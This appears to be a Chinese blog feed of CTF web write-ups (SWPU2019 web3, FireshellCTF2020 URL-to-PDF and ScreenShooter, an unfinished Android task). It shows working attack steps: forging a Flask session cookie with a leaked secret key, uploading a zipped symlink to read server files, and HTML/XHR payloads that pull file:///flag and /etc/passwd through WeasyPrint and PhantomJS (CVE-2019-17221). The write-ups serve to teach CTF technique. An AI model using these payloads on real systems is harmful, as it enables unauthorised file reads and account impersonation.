      
    </entry>
    
    
    
    <entry>
      <title>SWPU2019_web</title>
      <link href="2020/12/21/SWPU2019-web/"/>
      <url>2020/12/21/SWPU2019-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>这里以前解过了，懒得找了，继续向下做了，有空回去看看</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><strong>Tag：</strong></p><p>没连上ssr，先放放</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p><strong>Tag：身份伪造，flask session，</strong></p><p><a href="http://e4d2d590-f34d-4180-ab06-885ec9373a4a.node3.buuoj.cn/login">http://e4d2d590-f34d-4180-ab06-885ec9373a4a.node3.buuoj.cn/login</a></p><p>首先不用注册可以直接登录，然后点击upload显示权限不足，但是我们的用户名明明是admin啊，这里应该就是不是依照你的用户名来判断你的权限的了，然后我们拿下并瞅一瞅cookie的值<br><pre class="line-numbers language-cookie" data-language="cookie"><code class="language-cookie">session&#x3D;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>cookie里面session字段的值为<code>.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE</code>，不如尝试解一下base64试试。解不出来，是flask-session，github上有专门用于其解码和编码的工具，解码需要token，访问不存在的目录时会出现在响应头里面，直接base64解码即可。<br><pre class="line-numbers language-token" data-language="token"><code class="language-token">Swpuctf_csrf_token: U0VDUkVUX0tFWTprZXlxcXF3d3dlZWUhQCMkJV4mKg&#x3D;&#x3D;SECRET_KEY:keyqqqwwweee!@#$%^&amp;*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>或者没有token有有办法解出来这个session？用下面的脚本好像也行，我没试。<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>这种py的脚本一般用linux运行比较流畅，linux不愧是开发者的次爱。</p><p>解出来的session的明文内容如下所示:<br><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py decode -c &#39;.eJyrVspMUbKqVlJIUrJS8g1xLFeq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PL0IojHIPy42MCCtOcbS1BWkoLU4tykvMTcWhoBYAbr4gMA.X-BAHg.sL-SHZU_eJwtQWbI9pqvk-lhodE&#39; -s &#39;keyqqqwwweee!@#$%^&amp;*&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>'id'<span class="token operator">:</span> '<span class="token number">100</span>'<span class="token punctuation">,</span> 'is_login'<span class="token operator">:</span> True<span class="token punctuation">,</span> 'password'<span class="token operator">:</span> 'default'<span class="token punctuation">,</span> 'username'<span class="token operator">:</span> 'default'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这里我们的username与password并不是最重要的，注意到这里有个id字段，猜测这里可能类似linux里面的uid，root的id也许是1，伪造session:<br><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>'id'<span class="token operator">:</span> '<span class="token number">1</span>'<span class="token punctuation">,</span> 'is_login'<span class="token operator">:</span> True<span class="token punctuation">,</span> 'password'<span class="token operator">:</span> 'default'<span class="token punctuation">,</span> 'username'<span class="token operator">:</span> 'default'<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>伪造过程:<br><pre class="line-numbers language-none"><code class="language-none">python3 flask_session_cookie_manager3.py encode -s &#39;keyqqqwwweee!@#$%^&amp;*&#39; -t &quot;&#123;&#39;id&#39;: &#39;1&#39;, &#39;is_login&#39;: True, &#39;password&#39;: &#39;default&#39;, &#39;username&#39;: &#39;default&#39;&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>伪造结果<br><pre class="line-numbers language-none"><code class="language-none">.eJyrVspMUbJSMlTSUcosjs_JT8_MU7IqKSpN1VEqSCwuLs8vAkmnpKYlluaUABWVFqcW5SXmpiIJ1gIA-tEW8A.X-CEiQ.6wmZvxP1Jy1Vns2r_tXxu0Z_tFY<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>伪造admin之后就能上传文件了，查看源代码之后有py文件的源代码如下:<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span>methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'1'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method<span class="token operator">==</span><span class="token string">'POST'</span><span class="token punctuation">:</span>        m <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        name <span class="token operator">=</span> name<span class="token operator">+</span><span class="token string">'qweqweqwe'</span>        name <span class="token operator">=</span> name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        m<span class="token punctuation">.</span>update<span class="token punctuation">(</span>name<span class="token punctuation">)</span>        md5_one<span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        n <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>        ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr        ip <span class="token operator">=</span> ip<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>        n<span class="token punctuation">.</span>update<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>        md5_ip <span class="token operator">=</span> n<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        f<span class="token operator">=</span>request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        basepath<span class="token operator">=</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>realpath<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>md5_one<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/"</span>        path_base <span class="token operator">=</span> basepath<span class="token operator">+</span><span class="token string">'/upload/'</span><span class="token operator">+</span>md5_ip<span class="token operator">+</span><span class="token string">'/'</span>        filename <span class="token operator">=</span> f<span class="token punctuation">.</span>filename        pathname <span class="token operator">=</span> path<span class="token operator">+</span>filename        <span class="token keyword">if</span> <span class="token string">"zip"</span> <span class="token operator">!=</span> filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'zip only allowed'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>pathname<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            cmd <span class="token operator">=</span> <span class="token string">"unzip -n -d "</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span> pathname            <span class="token keyword">if</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> cmd<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>waf<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>        unzip_file <span class="token operator">=</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>pathname<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span>        unzip_filename <span class="token operator">=</span> unzip_file<span class="token punctuation">.</span>namelist<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'is_login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'not login'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> unzip_filename<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>                <span class="token keyword">return</span> <span class="token string">'error'</span>            image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token operator">+</span>unzip_filename<span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>            resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>            <span class="token keyword">return</span> resp        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            shutil<span class="token punctuation">.</span>rmtree<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span>path_base<span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token string">'error'</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/showflag'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">showflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token boolean">True</span> <span class="token operator">==</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        image <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./flag/flag.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>image<span class="token punctuation">)</span>        resp<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'image/png'</span>        <span class="token keyword">return</span> resp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"can't give you"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>最后这个true==false太秀了，原来是告诉我flag文件是藏在./flag目录下的，恕我眼拙。</p><p>下面的为新学到的内容</p><blockquote><p>ln -s是Linux的一种软连接,类似与windows的快捷方式<br>ln -s /etc/passwd forever404 这会出现一个forever404文本,里面包含密码<br>/proc/self 记录了系统运行的信息状态等,cwd 指向当前进程运行目录的一个符号链接,即flask运行进程目录</p></blockquote><pre class="line-numbers language-none"><code class="language-none">ln -s &#x2F;proc&#x2F;self&#x2F;cwd&#x2F;flag&#x2F;flag.jpg testzip -ry test.zip test其中-y参数代表的含义为:直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>就是先用ln命令保存一个符号链接在当前目录下，然后使用zip命令再将该test文件压缩为test.zip文件名的文件，直接将该文件上传之后抓包即得flag。会将该进程下的flag.jpg文件的内容返回。<br><code>flag&#123;d4b1eed3-fcd5-4781-8c49-5b4a85c1bf27&#125;</code><br><img src="/2020/12/21/SWPU2019-web/1.png" alt></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FireshellCTF2020复现</title>
      <link href="2020/12/15/FireshellCTF2020%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/12/15/FireshellCTF2020%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>注:第一个在其他的文章里面是个assa的什么题目，直接包含<code>#include &quot;/flag&quot;</code>报错好像就行了。</p></blockquote><h2 id="1-URL-TO-PDF"><a href="#1-URL-TO-PDF" class="headerlink" title="1.URL TO PDF"></a>1.URL TO PDF</h2><p>看wp，说是WeasyPrint的一个专门的漏洞，会把网站里面有些东西先解析一边，然后再给打印出来pdf，所以先写一个界面放在我的服务器端。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span><span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token double-quoted-string string">"en"</span><span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token double-quoted-string string">"UTF-8"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span><span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token double-quoted-string string">"attachment"</span> href<span class="token operator">=</span><span class="token double-quoted-string string">"file:///flag"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后请求一下，就能获得一个pdf文件了，然后丢进kali里面，使用下面的命令下载工具<br><pre class="line-numbers language-none"><code class="language-none">sudo apt-get updatesudo apt-get install poppler-utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>就有工具pdfdetach啦，这个工具可以分离出pdf文件中嵌入的数据。。。<br><pre class="line-numbers language-none"><code class="language-none">pdfdetach e14071e5d454cd17815fe8cfc7e87303.pdf -saveall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>直接分离出flag，这也太misc了。<br><code>flag&#123;2e8b851d-dcaa-4f4d-bbce-a32f1c1fe5ca&#125;</code></p><h2 id="2-ScreenShooter"><a href="#2-ScreenShooter" class="headerlink" title="2.ScreenShooter"></a>2.ScreenShooter</h2><p>他们当时做的时候可以显示到信息泄露，但是我复现的时候没发现。可能是我环境的问题，不过也算是学习了，ua也能泄露信息。<br><code>Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1</code></p><p>这是一个2019的CVE，CVE-2019-17221，好家伙，网上流传的poc很少，知道这是哪个cve之后先上<a href="https://github.com/h4ckologic/CVE-2019-17221">gayhub</a>，pdf文件里面有poc，如下<br><pre class="line-numbers language-html" data-language="html"><code class="language-html">File: test.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>对此我们可以稍加改动，将<code>/etc/passwd</code>改为<code>/flag</code>即可：<br><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">x<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function-variable function">onload</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>responseText<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">,</span><span class="token string">"file:///flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>x<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>搞到我的服务器上面，访问我服务器的页面获得png，上面就有flag（看不到的话下载到本地可以看到）。</p><p><code>flag&#123;5d291771-7886-42df-9cb6-9fe99860da38&#125;</code></p><h2 id="3-Cars"><a href="#3-Cars" class="headerlink" title="3.Cars"></a>3.Cars</h2><p>先把附件解压缩一下，是个安卓，做过一点垃圾安卓软件，了解一点目录结构。</p><p>就先去找java目录，目录深层有个CARS的文件夹，用vscode打开之后分析kotlin源码，其实跟java没啥差别，找到<code>Rest.kt</code>文件，里面的代码为:<br><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">package</span> com<span class="token punctuation">.</span>arconsultoria<span class="token punctuation">.</span>cars<span class="token punctuation">.</span>rest<span class="token keyword">import</span> com<span class="token punctuation">.</span>arconsultoria<span class="token punctuation">.</span>cars<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>Car<span class="token keyword">import</span> com<span class="token punctuation">.</span>arconsultoria<span class="token punctuation">.</span>cars<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>Comment<span class="token keyword">import</span> com<span class="token punctuation">.</span>arconsultoria<span class="token punctuation">.</span>cars<span class="token punctuation">.</span>domain<span class="token punctuation">.</span>CommentResponse<span class="token keyword">import</span> retrofit2<span class="token punctuation">.</span>Call<span class="token keyword">import</span> retrofit2<span class="token punctuation">.</span>http<span class="token punctuation">.</span>Body<span class="token keyword">import</span> retrofit2<span class="token punctuation">.</span>http<span class="token punctuation">.</span>GET<span class="token keyword">import</span> retrofit2<span class="token punctuation">.</span>http<span class="token punctuation">.</span>POST<span class="token keyword">import</span> retrofit2<span class="token punctuation">.</span>http<span class="token punctuation">.</span>Path<span class="token keyword">interface</span> Rest <span class="token punctuation">&#123;</span>    <span class="token annotation builtin">@GET</span><span class="token punctuation">(</span><span class="token string">"/cars"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">getCars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Call<span class="token operator">&lt;</span>List<span class="token operator">&lt;</span>Car<span class="token operator">></span><span class="token operator">></span>    <span class="token annotation builtin">@GET</span><span class="token punctuation">(</span><span class="token string">"/car/&#123;id&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">getCar</span><span class="token punctuation">(</span><span class="token annotation builtin">@Path</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span> id<span class="token operator">:</span> Int<span class="token punctuation">)</span><span class="token operator">:</span> Call<span class="token operator">&lt;</span>Car<span class="token operator">></span>    <span class="token annotation builtin">@POST</span><span class="token punctuation">(</span><span class="token string">"/comment"</span><span class="token punctuation">)</span>    <span class="token keyword">fun</span> <span class="token function">postComment</span><span class="token punctuation">(</span><span class="token annotation builtin">@Body</span> comment<span class="token operator">:</span> Comment<span class="token punctuation">)</span><span class="token 